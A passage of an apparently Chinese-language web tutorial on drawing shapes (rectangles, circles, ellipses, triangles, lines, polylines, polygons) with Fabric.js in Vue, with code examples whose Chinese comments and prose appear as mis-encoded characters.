<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// fabric.Image.fromURLï¼šåŠ è½½å›¾ç‰‡çš„api</span>
  <span class="hljs-comment">// ç¬¬ä¸€ä¸ªå‚æ•°ï¼šå›¾ç‰‡åœ°å€ï¼ˆå¯ä»¥æ˜¯æœ¬åœ°çš„ï¼Œä¹Ÿå¯ä»¥æ˜¯ç½‘ç»œå›¾ï¼‰</span>
  <span class="hljs-comment">// ç¬¬äºŒä¸ªå‚æ•°ï¼šå›¾ç‰‡åŠ è½½çš„å›è°ƒå‡½æ•°</span>
  fabric.<span class="hljs-property">Image</span>.<span class="hljs-title function_">fromURL</span>(
    <span class="hljs-string">'å›¾ç‰‡url'</span>,
    <span class="hljs-function">(<span class="hljs-params">img</span>) =&gt;</span> {
      <span class="hljs-comment">// è®¾ç½®èƒŒæ™¯å›¾</span>
      canvas.<span class="hljs-title function_">setBackgroundImage</span>(
        img,
        canvas.<span class="hljs-property">renderAll</span>.<span class="hljs-title function_">bind</span>(canvas),
        {
          <span class="hljs-attr">scaleX</span>: canvas.<span class="hljs-property">width</span> / img.<span class="hljs-property">width</span>, <span class="hljs-comment">// è®¡ç®—å‡ºå›¾ç‰‡è¦æ‹‰ä¼¸çš„å®½åº¦</span>
          <span class="hljs-attr">scaleY</span>: canvas.<span class="hljs-property">height</span> / img.<span class="hljs-property">height</span> <span class="hljs-comment">// è®¡ç®—å‡ºå›¾ç‰‡è¦æ‹‰ä¼¸çš„é«˜åº¦</span>
        }
      )
    }
  )
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>è¿™ä¸ªä¾‹å­ä½¿ç”¨äº† <code>fabric.Image.fromURL</code> è¿™ä¸ª <code>api</code> æ¥åŠ è½½å›¾ç‰‡ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å›¾ç‰‡åœ°å€ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å›è°ƒå‡½æ•°ã€‚</p>
<p>æ‹¿åˆ°å›¾ç‰‡çš„å‚æ•°å’Œç”»å¸ƒçš„å®½é«˜è¿›è¡Œè®¡ç®—ï¼Œä»è€Œä½¿å›¾ç‰‡å……æ»¡å…¨å±ã€‚</p>
<h2 data-id="heading-11">åŸºç¡€å›¾å½¢</h2>
<h3 data-id="heading-12">çŸ©å½¢</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7072f26826404a3c95cf5a3d441e6a6f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=y0C1nTfu9W1vbvjxbJ8%2BRmmQqqE%3D" alt="015.png" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"375"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// è·ç¦»å®¹å™¨é¡¶éƒ¨ 100px</span>
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// è·ç¦»å®¹å™¨å·¦ä¾§ 100px</span>
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'orange'</span>, <span class="hljs-comment">// å¡«å…… æ©™è‰²</span>
    <span class="hljs-attr">width</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// å®½åº¦ 100px</span>
    <span class="hljs-attr">height</span>: <span class="hljs-number">100</span> <span class="hljs-comment">// é«˜åº¦ 100px</span>
  })
  
  <span class="hljs-comment">// å°†çŸ©å½¢æ·»åŠ åˆ°ç”»å¸ƒä¸­</span>
  canvas.<span class="hljs-title function_">add</span>(rect)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>ä½¿ç”¨ <code>new fabric.Rect</code> åˆ›å»º <strong>çŸ©å½¢</strong>ã€‚</p>
<h3 data-id="heading-13">åœ†è§’çŸ©å½¢</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d36214b8b0e4496910c2a16600bb3f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=2TUue1HTXRrxnZTotTbGTkfsP6Q%3D" alt="016.png" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"375"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// è·ç¦»å®¹å™¨é¡¶éƒ¨ 100px</span>
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// è·ç¦»å®¹å™¨å·¦ä¾§ 100px</span>
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'orange'</span>, <span class="hljs-comment">// å¡«å…… æ©™è‰²</span>
    <span class="hljs-attr">width</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// å®½åº¦ 100px</span>
    <span class="hljs-attr">height</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// é«˜åº¦ 100px</span>
    <span class="hljs-attr">rx</span>: <span class="hljs-number">20</span>, <span class="hljs-comment">// xè½´çš„åŠå¾„</span>
    <span class="hljs-attr">ry</span>: <span class="hljs-number">20</span> <span class="hljs-comment">// yè½´çš„åŠå¾„</span>
  })
  
  <span class="hljs-comment">// å°†çŸ©å½¢æ·»åŠ åˆ°ç”»å¸ƒä¸­</span>
  canvas.<span class="hljs-title function_">add</span>(rect)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>ç”»åœ†è§’çŸ©å½¢ï¼Œéœ€è¦æ·»åŠ  <code>rx</code> å’Œ <code>ry</code>ã€‚</p>
<h3 data-id="heading-14">åœ†å½¢</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df2c37a8fcf848fba3b808a4821fac17~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=wGahQ1Tiqm%2Bs0jomz4zfqw9WWEQ%3D" alt="017.png" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"375"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> circle = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Circle</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">radius</span>: <span class="hljs-number">50</span>, <span class="hljs-comment">// åœ†çš„åŠå¾„ 50</span>
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'green'</span>
  })
  canvas.<span class="hljs-title function_">add</span>(circle)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>ä½¿ç”¨ <code>new fabric.Circle</code> åˆ›å»º<strong>åœ†å½¢</strong>ã€‚</p>
<p>åœ†å½¢éœ€è¦ä½¿ç”¨ <code>radius</code> è®¾ç½®åŠå¾„å¤§å°ã€‚</p>
<h3 data-id="heading-15">æ¤­åœ†å½¢</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b48955164db04c8b9b7b6e011d5a6f33~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=THOJkfXk4oED23XWz7xSl4Nt8zQ%3D" alt="018.png" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"375"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> ellipse = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Ellipse</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">rx</span>: <span class="hljs-number">70</span>,
    <span class="hljs-attr">ry</span>: <span class="hljs-number">30</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'hotpink'</span>
  })
  canvas.<span class="hljs-title function_">add</span>(ellipse)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>éœ€è¦ä½¿ç”¨ <code>new fabric.Ellipse</code> åˆ›å»º <strong>æ¤­åœ†</strong>ã€‚</p>
<p>å’Œåœ†å½¢ä¸åŒï¼Œæ¤­åœ†ä¸éœ€è¦è®¾ç½® <code>radius</code> ï¼Œä½†è¦è®¾ç½® <code>rx</code> å’Œ <code>ry</code>ã€‚</p>
<ul>
<li>å½“ <code>rx</code> &gt; <code>ry</code> ï¼šæ¤­åœ†æ˜¯æ¨ªç€çš„</li>
<li>å½“ <code>rx</code> &lt; <code>ry</code>ï¼šæ¤­åœ†æ˜¯ç«–ç€çš„</li>
<li>å½“ <code>rx</code> = <code>ry</code>ï¼š çœ‹ä¸Šå»å°±æ˜¯ä¸ªåœ†å½¢</li>
</ul>
<h3 data-id="heading-16">ä¸‰è§’å½¢</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6b40e25707b345f3bd6104fe665fb881~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=rRIDsix7FnQLb5E8%2FIEW7qLbAR8%3D" alt="019.png" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"375"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> triangle = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Triangle</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">80</span>, <span class="hljs-comment">// åº•è¾¹é•¿åº¦</span>
    <span class="hljs-attr">height</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// åº•è¾¹åˆ°å¯¹è§’çš„è·ç¦»</span>
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'blue'</span>
  })
  canvas.<span class="hljs-title function_">add</span>(triangle)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>ä½¿ç”¨ <code>new fabric.Triangle</code> åˆ›å»ºä¸‰è§’å½¢ï¼Œä¸‰è§’å½¢æ˜¯éœ€è¦ç»™å®š â€œåº•å’Œé«˜â€ çš„ã€‚</p>
<h3 data-id="heading-17">çº¿æ®µ</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d59d415f9bc4685b80648277c7481a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=2N6hmFUyyCVcSgFQJ66N2gWbOHE%3D" alt="020.png" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"375"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> line = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Line</span>(
    [
      <span class="hljs-number">10</span>, <span class="hljs-number">10</span>, <span class="hljs-comment">// èµ·å§‹ç‚¹åæ ‡</span>
      <span class="hljs-number">200</span>, <span class="hljs-number">300</span> <span class="hljs-comment">// ç»“æŸç‚¹åæ ‡</span>
    ],
    {
      <span class="hljs-attr">stroke</span>: <span class="hljs-string">'red'</span>, <span class="hljs-comment">// ç¬”è§¦é¢œè‰²</span>
    }
  )
  canvas.<span class="hljs-title function_">add</span>(line)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>ä½¿ç”¨ <code>new fabric.Line</code> åˆ›å»ºçº¿æ®µã€‚</p>
<p><code>new fabric.Line</code> éœ€è¦ä¼ å…¥2ä¸ªå‚æ•°ã€‚</p>
<ul>
<li>
<p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ <strong>æ•°ç»„</strong> ï¼Œæ•°ç»„éœ€è¦ä¼ 4ä¸ªå€¼ï¼Œ<strong>å‰2ä¸ªå€¼æ˜¯èµ·å§‹åæ ‡çš„xå’Œyï¼Œå2ä¸ªå€¼æ˜¯ç»“æŸåæ ‡çš„xå’Œy</strong>ã€‚</p>
</li>
<li>
<p>ç¬¬äºŒä¸ªå‚æ•°æ˜¯ <strong>çº¿æ®µçš„æ ·å¼</strong>ï¼Œè¦è®¾ç½®çº¿æ®µçš„é¢œè‰²ï¼Œéœ€è¦ä½¿ç”¨ <code>stroke</code> ã€‚</p>
</li>
</ul>
<h3 data-id="heading-18">æŠ˜çº¿</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b174ce0b9c5544d1b997029bd2094912~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=Set1FSW87bWpJ2s%2B6sDvV%2FHyXGI%3D" alt="021.png" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"375"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> polyline = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Polyline</span>([
    {<span class="hljs-attr">x</span>: <span class="hljs-number">30</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">30</span>},
    {<span class="hljs-attr">x</span>: <span class="hljs-number">150</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">140</span>},
    {<span class="hljs-attr">x</span>: <span class="hljs-number">240</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">150</span>},
    {<span class="hljs-attr">x</span>: <span class="hljs-number">100</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">30</span>}
  ], {
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'transparent'</span>, <span class="hljs-comment">// å¦‚æœç”»æŠ˜çº¿ï¼Œéœ€è¦å¡«å……é€æ˜</span>
    <span class="hljs-attr">stroke</span>: <span class="hljs-string">'#6639a6'</span>, <span class="hljs-comment">// çº¿æ®µé¢œè‰²ï¼šç´«è‰²</span>
    <span class="hljs-attr">strokeWidth</span>: <span class="hljs-number">5</span> <span class="hljs-comment">// çº¿æ®µç²—ç»† 5</span>
  })
  canvas.<span class="hljs-title function_">add</span>(polyline)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>ä½¿ç”¨ <code>new fabric.Polyline</code> åˆ›å»º<strong>çº¿æ®µ</strong> ã€‚</p>
<p><code>new fabric.Polyline</code> éœ€è¦ä¼ å…¥2ä¸ªå‚æ•°ã€‚</p>
<ul>
<li>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ•°ç»„ï¼Œæè¿°çº¿æ®µçš„æ¯ä¸€ä¸ªç‚¹</li>
<li>ç¬¬äºŒä¸ªå‚æ•°ç”¨æ¥æè¿°çº¿æ®µæ ·å¼</li>
</ul>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ <code>fill</code> è®¾ç½®æˆé€æ˜æ‰ä¼šæ˜¾ç¤ºæˆçº¿æ®µï¼Œå¦‚æœä¸è®¾ç½®ï¼Œä¼šé»˜è®¤å¡«å……é»‘è‰²ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/103b44cf02b441b18d35f0e1b805a5e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=aOBb4dFmcCEZk4bJ5w6W9qaXnKE%3D" alt="022.png" loading="lazy"/></p>
<p>ä½ ä¹Ÿå¯ä»¥å¡«å……è‡ªå·±å–œæ¬¢çš„é¢œè‰²ï¼Œ<code>new fabric.Polyline</code> æ˜¯ä¸ä¼šè‡ªåŠ¨æŠŠ <strong>èµ·å§‹ç‚¹</strong> å’Œ <strong>ç»“æŸç‚¹</strong> è‡ªåŠ¨é—­åˆèµ·æ¥çš„ã€‚</p>
<h3 data-id="heading-19">å¤šè¾¹å½¢</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/610b0cffd2924cae8814de8e877746dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=V5tgS%2FKwsKUOIOosuORFLxAdYJo%3D" alt="023.png" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"375"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> polygon = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Polygon</span>([
    {<span class="hljs-attr">x</span>: <span class="hljs-number">30</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">30</span>},
    {<span class="hljs-attr">x</span>: <span class="hljs-number">150</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">140</span>},
    {<span class="hljs-attr">x</span>: <span class="hljs-number">240</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">150</span>},
    {<span class="hljs-attr">x</span>: <span class="hljs-number">100</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">30</span>}
  ], {
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'#ffd3b6'</span>, <span class="hljs-comment">// å¡«å……è‰²</span>
    <span class="hljs-attr">stroke</span>: <span class="hljs-string">'#6639a6'</span>, <span class="hljs-comment">// çº¿æ®µé¢œè‰²ï¼šç´«è‰²</span>
    <span class="hljs-attr">strokeWidth</span>: <span class="hljs-number">5</span> <span class="hljs-comment">// çº¿æ®µç²—ç»† 5</span>
  })
  canvas.<span class="hljs-title function_">add</span>(polygon)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>ä½¿ç”¨ <code>new fabric.Polygon</code> ç»˜åˆ¶å¤šè¾¹å½¢ï¼Œç”¨æ³•å’Œ <code>new fabric.Polyline</code> å·®ä¸å¤šï¼Œä½†æœ€å¤§çš„ä¸åŒç‚¹æ˜¯ <code>new fabric.Polygon</code> ä¼šè‡ªåŠ¨æŠŠ <strong>èµ·å§‹ç‚¹</strong> å’Œ <strong>ç»“æŸç‚¹</strong> è¿æ¥èµ·æ¥ã€‚</p>
<h2 data-id="heading-20">è‡ªå®šä¹‰å›¾å½¢</h2>
